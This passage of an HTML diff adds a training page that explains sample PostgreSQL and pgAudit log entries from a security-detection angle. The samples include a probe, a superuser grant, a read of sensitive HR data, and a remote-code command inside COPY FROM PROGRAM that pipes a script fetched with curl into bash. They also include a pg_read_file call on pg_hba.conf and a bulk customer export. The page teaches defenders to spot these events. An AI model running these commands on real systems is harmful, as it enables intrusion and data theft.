+DETAIL:  Connection matched pg_hba.conf line 96: "host all all 0.0.0.0/0 scram-sha-256"</div>
+          <div class="cmd-output">The DETAIL line is the more serious finding: pg_hba.conf permits connections from the entire internet. Fixing the network exposure matters more than the failed password.</div>
+        </div>
+
+        <div class="implementation-steps">
+          <h3>Unauthorised Network Probe (SQLSTATE 28000)</h3>
+          <div class="config-snippet">
+2025-07-14 09:39:08.117 UTC [31840] [unknown]@[unknown] 198.51.100.203:44120
+FATAL:  no pg_hba.conf entry for host "198.51.100.203", user "admin", database "postgres", no encryption</div>
+          <div class="cmd-output">A host from an unauthorised network reached port 5432 and attempted an unencrypted connection as "admin". This is scanning activity and should feed both database and network detections.</div>
+        </div>
+
+        <div class="implementation-steps">
+          <h3>pgAudit: Superuser Role Granted</h3>
+          <div class="config-snippet">
+2025-07-14 09:52:44.902 UTC [31955] app_rw@shopdb 10.30.2.61:52190 psql
+LOG:  AUDIT: SESSION,14,1,ROLE,ALTER ROLE,,,"ALTER ROLE reporting_svc WITH SUPERUSER;",&lt;none&gt;</div>
+          <div class="cmd-output">An application role granting SUPERUSER to a service account. In PostgreSQL, superuser means unrestricted file and command access on the host, not merely full database access.</div>
+        </div>
+
+        <div class="implementation-steps">
+          <h3>pgAudit: Command Execution via COPY FROM PROGRAM</h3>
+          <div class="config-snippet">
+2025-07-14 09:55:12.338 UTC [31955] reporting_svc@shopdb 10.30.2.61:52190 psql
+LOG:  AUDIT: SESSION,17,1,WRITE,COPY,TABLE,public.cmd_out,"COPY cmd_out FROM PROGRAM 'curl -s http://203.0.113.44/p.sh | bash';",&lt;none&gt;</div>
+          <div class="cmd-output">Direct remote code execution as the postgres operating system user. The newly granted superuser privilege from the previous entry is what made this possible: the two events are one chain.</div>
+        </div>
+
+        <div class="implementation-steps">
+          <h3>pgAudit: Sensitive Table Read via Object Auditing</h3>
+          <div class="config-snippet">
+2025-07-14 02:18:57.204 UTC [32104] r_almutairi@hrdb 10.30.7.19:49882 DBeaver
+LOG:  AUDIT: OBJECT,23,1,READ,SELECT,TABLE,hr.employees,"SELECT employee_id, national_id, salary FROM hr.employees;",&lt;none&gt;</div>
+          <div class="cmd-output">An OBJECT class record produced by pgaudit.role rather than global READ auditing. A full extract of national ID and salary at 02:18 from an ad hoc SQL client warrants investigation.</div>
+        </div>
+
+        <div class="implementation-steps">
+          <h3>Server-Side File Read</h3>
+          <div class="config-snippet">
+2025-07-14 09:57:31.660 UTC [31955] reporting_svc@shopdb 10.30.2.61:52190 psql
+LOG:  AUDIT: SESSION,19,1,FUNCTION,SELECT,,,"SELECT pg_read_file('/etc/postgresql/16/main/pg_hba.conf');",&lt;none&gt;</div>
+          <div class="cmd-output">Reading the host authentication configuration reveals which networks and authentication methods are trusted: direct reconnaissance for the next stage of the attack.</div>
+        </div>
+
+        <div class="implementation-steps">
+          <h3>Slow Query: Bulk Extraction</h3>
+          <div class="config-snippet">
+2025-07-14 10:02:44.881 UTC [31955] reporting_svc@shopdb 10.30.2.61:52190 psql
+LOG:  duration: 38812.447 ms  statement: COPY (SELECT * FROM customers) TO '/tmp/.c/out.csv' WITH CSV;</div>
+          <div class="cmd-output">A server-side COPY writing the full customer table to a hidden directory. Duration alone would have flagged this even without pgAudit enabled.</div>
+        </div>
+      </div>
+
+      <div class="back-button-container">
+        <a href="Databaseslogs.html" class="explore-button">
+          <i class="fas fa-arrow-left"></i> Back </a>
+      </div>
+    </div>
+  </body>
+</html>
